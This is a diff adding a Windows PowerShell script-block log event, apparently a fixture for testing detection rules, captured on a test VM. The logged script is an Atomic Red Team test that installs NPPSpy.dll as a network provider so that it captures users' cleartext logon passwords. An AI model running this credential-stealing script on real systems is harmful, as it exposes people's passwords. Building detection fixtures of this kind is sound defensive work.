@@ -1,0 +1,52 @@
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "System": {
+      "Provider": {
+        "#attributes": {
+          "Name": "Microsoft-Windows-PowerShell",
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
+        }
+      },
+      "EventID": 4104,
+      "Version": 1,
+      "Level": 3,
+      "Task": 2,
+      "Opcode": 15,
+      "Keywords": "0x0",
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2026-08-07T08:08:00.9693020Z"
+        }
+      },
+      "EventRecordID": 15799,
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "C341F3D2-25B9-0001-7DE0-5FC3B925DD01"
+        }
+      },
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 7688,
+          "ThreadID": 9904
+        }
+      },
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "SigmaCatchVm",
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-4246997345-1000708036-2014123355-1001"
+        }
+      }
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "ScriptBlockText": "& {Copy-Item \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"}",
+      "ScriptBlockId": "771ae492-3094-44d3-b891-74da37e63e1f",
+      "Path": ""
+    }
+  }
+}
